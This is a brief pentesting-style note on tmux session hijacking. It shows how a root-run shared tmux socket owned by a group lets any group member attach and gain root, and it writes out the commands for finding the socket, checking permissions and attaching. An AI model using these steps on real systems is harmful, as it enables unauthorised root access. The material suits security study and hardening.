# Tmux Session Hijacking

A user may leave a tmux process running as a privileged user, which can be hijacked

```shellscript
# Create a new shared session
tmux -S /shareds new -s debugsess
chown root:devs /shareds

# If we can compromise a user in the devs group, we can attach to this session and gain 
# root access

# Look for running tmux processes
ps aux | grep tmux

# Confirm permissions
ls -la /shareds 

# Reviewx our group membership
id

# Attack to the tmux session
tmux -S /shareds
```
